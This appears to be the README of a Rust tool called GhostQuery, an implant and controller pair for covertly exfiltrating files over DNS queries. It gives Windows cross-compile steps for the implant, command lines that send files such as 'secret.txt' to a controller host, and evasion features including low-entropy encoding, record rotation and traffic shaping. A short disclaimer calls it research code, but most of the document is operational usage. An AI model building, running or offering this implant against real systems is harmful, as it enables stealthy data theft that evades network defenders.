# GhostQuery Protocol - Implementation

An Asymmetric DNS Exfiltration Protocol inspired by ADSM (Asymmetric Distributed Shared Memory).

## Overview

GhostQuery is a covert communication protocol that uses DNS queries for data exfiltration. It implements:

- **Edge Node (Implant/Writer)**: Exfiltrates data via DNS queries
- **Master Node (Controller/Reader)**: Receives data via authoritative DNS server
- **ADSM-inspired architecture**: Asymmetric, release-consistent data transfer
- **Stealth features**: Low-entropy encoding, multi-record rotation, realistic TTLs

## Building

### Prerequisites

- Rust 1.70+ (install from https://rustup.rs)
- For Windows builds: `cargo install cross` (for cross-compilation)

### Build for Current Platform

```bash
# Build debug version
cargo build

# Build optimized release version
cargo build --release

# Binaries will be in:
# - target/release/gq-controller (server)
# - target/release/gq-implant (client)
```

### Cross-Compile for Windows

From macOS/Linux to Windows:

```bash
# Install cross-compilation tool
cargo install cross

# Build Windows executable
cross build --release --target x86_64-pc-windows-gnu --bin gq-controller
cross build --release --target x86_64-pc-windows-gnu --bin gq-implant

# Or using rustup (if you have Windows toolchain installed)
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu

# Binaries will be in:
# target/x86_64-pc-windows-gnu/release/gq-controller.exe
# target/x86_64-pc-windows-gnu/release/gq-implant.exe
```

## Usage

### 1. Controller (Server/Receiver)

The controller runs an authoritative DNS server to receive exfiltrated data.

```bash
# Basic usage (requires root/admin for port 53)
sudo ./gq-controller \
  --bind 0.0.0.0:53 \
  --domain ghost.local \
  --output ./received_files \
  --key <64-char-hex-key>

# Generate a random key (will be printed)
sudo ./gq-controller --bind 0.0.0.0:53 --domain ghost.local --output ./output

# With verbose logging
sudo ./gq-controller -b 0.0.0.0:53 -d ghost.local -o ./output -v
```

**Options:**
- `-b, --bind <ADDR>`: Bind address (default: 0.0.0.0:53)
- `-d, --domain <DOMAIN>`: Authoritative domain (default: ghost.local)
- `-o, --output <DIR>`: Output directory for received files
- `-k, --key <HEX>`: Master encryption key (64 hex chars = 32 bytes)
- `-v, --verbose`: Enable debug logging

### 2. Implant (Client/Sender)

The implant exfiltrates files via DNS queries.

```bash
# Basic usage
./gq-implant \
  --file secret.txt \
  --domain ghost.local \
  --server 192.168.1.100:53 \
  --key <64-char-hex-key>

# With custom settings
./gq-implant \
  -f sensitive_data.pdf \
  -d ghost.local \
  -s 10.0.0.5:53 \
  --chunk-size 32 \
  --window-size 8 \
  --delay 100 \
  -k <shared-key>
```

**Options:**
- `-f, --file <PATH>`: File to exfiltrate (required)
- `-d, --domain <DOMAIN>`: Target domain (default: ghost.local)
- `-s, --server <ADDR>`: DNS server address (e.g., 8.8.8.8:53)
- `--chunk-size <BYTES>`: Chunk size (default: 32)
- `--window-size <N>`: Sliding window size (default: 8)
- `--delay <MS>`: Delay between queries in milliseconds (default: 100)
- `-k, --key <HEX>`: Master encryption key (must match controller)
- `-v, --verbose`: Enable debug logging

## Testing in Local VM

### Setup 1: Two VMs (Recommended)

**VM 1 - Controller (Ubuntu/Debian):**

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Build the project
cd GhostQueryProtocol
cargo build --release

# Create output directory
mkdir -p ~/received

# Run controller (as root for port 53)
sudo ./target/release/gq-controller \
  --bind 0.0.0.0:53 \
  --domain test.local \
  --output ~/received \
  --verbose

# Note the generated key from the output!
```

**VM 2 - Implant (Any OS):**

```bash
# Create test file
echo "This is secret data for testing" > test.txt

# Run implant (use the key from controller)
./target/release/gq-implant \
  --file test.txt \
  --domain test.local \
  --server <VM1-IP>:53 \
  --key <key-from-controller> \
  --verbose

# Check VM1's ~/received directory for the exfiltrated file
```

### Setup 2: Single VM with Loopback

```bash
# Terminal 1 - Controller
sudo ./target/release/gq-controller \
  -b 127.0.0.1:5353 \
  -d test.local \
  -o ./output \
  -v

# Terminal 2 - Implant
echo "Test data" > test.txt
./target/release/gq-implant \
  -f test.txt \
  -d test.local \
  -s 127.0.0.1:5353 \
  -k <key-from-terminal-1> \
  -v
```

### Setup 3: Docker Testing

Create `docker-compose.yml`:

```yaml
version: '3.8'
services:
  controller:
    image: rust:latest
    volumes:
      - .:/app
    working_dir: /app
    command: >
      bash -c "cargo build --release && 
               ./target/release/gq-controller 
               -b 0.0.0.0:53 
               -d ghost.local 
               -o /output 
               -v"
    ports:
      - "53:53/udp"
    networks:
      - ghostnet

  implant:
    image: rust:latest
    volumes:
      - .:/app
    working_dir: /app
    depends_on:
      - controller
    command: >
      bash -c "sleep 5 && 
               echo 'Secret data' > /tmp/test.txt &&
               cargo build --release && 
               ./target/release/gq-implant 
               -f /tmp/test.txt 
               -d ghost.local 
               -s controller:53 
               -k <shared-key> 
               -v"
    networks:
      - ghostnet

networks:
  ghostnet:
```

## Verification

After exfiltration completes:

```bash
# On controller VM, check received files
ls -lh ~/received/

# Compare hashes
sha256sum original_file.txt
sha256sum ~/received/<session-id>.bin

# They should match!
```

## Troubleshooting

### Port 53 Permission Denied

```bash
# Option 1: Run as root
sudo ./gq-controller ...

# Option 2: Use unprivileged port
./gq-controller --bind 0.0.0.0:5353 ...

# Option 3: Grant capabilities (Linux)
sudo setcap CAP_NET_BIND_SERVICE=+eip ./target/release/gq-controller
```

### DNS Resolution Issues

```bash
# Test DNS connectivity
dig @<controller-ip> test.ghost.local

# Check firewall
sudo ufw allow 53/udp  # Ubuntu/Debian
sudo firewall-cmd --add-port=53/udp --permanent  # CentOS/RHEL
```

### Build Errors

```bash
# Update Rust
rustup update

# Clean and rebuild
cargo clean
cargo build --release
```

## Architecture

```
Implant (Writer)          DNS Queries           Controller (Reader)
+---------------+         [Encoded Data]        +------------------+
|               |  ----------------------->     |                  |
| - Chunker     |                               | - DNS Server     |
| - Encoder     |  <-----------------------     | - Shadow Memory  |
| - Encryptor   |      [Control Commands]       | - Reassembler    |
| - Window Ctrl |                               | - Coherence      |
+---------------+                               +------------------+
```

## Key Features

- **Encryption**: AES-256-GCM with session-derived keys
- **Encoding**: Dictionary-based low-entropy encoding
- **Transport**: Multi-record DNS rotation (A/AAAA/CNAME/MX/TXT)
- **Reliability**: Sliding window with automatic retransmission
- **Stealth**: Realistic TTLs, entropy reduction, traffic shaping

## Security Notes

**This is a research/educational implementation. Use responsibly and only in authorized environments.**

- Always use strong encryption keys (32 random bytes)
- Keys are transmitted in cleartext via CLI - use secure channels
- DNS traffic may be logged by resolvers and firewalls
- ICMP side-channel requires raw socket permissions

## License

MIT License - See LICENSE file

